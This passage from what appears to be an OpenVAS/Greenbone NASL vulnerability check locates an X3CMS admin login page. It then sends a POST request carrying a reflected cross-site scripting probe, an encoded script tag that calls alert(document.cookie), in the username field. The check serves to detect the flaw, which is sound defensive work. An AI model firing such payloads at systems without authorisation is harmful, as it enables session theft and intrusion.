...
for dir in nasl_make_list_unique( "/", "/x3cms", "/cms", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	sndReq = http_get( item: NASLString( dir, "/admin/login.php" ), port: port );
	rcvRes = http_keepalive_send_recv( port: port, data: sndReq, bodyonly: TRUE );
	if(rcvRes && ( ContainsString( rcvRes, ">User login | X3CMS<" ) && ContainsString( rcvRes, ">X3 CMS<" ) )){
		postdata = "username=%27%22%3C%2Fscript%3E%3Cscript%3Ealert%28" + "document.cookie%29%3C%2Fscript%3E&password=&captcha" + "=&x4token=e14d2ab67683e7faa09983fb521e4835&nigolmrof=";
		req = NASLString( "POST ", dir, "/admin/login.php HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postdata ), "\\r\\n", "\\r\\n", postdata );
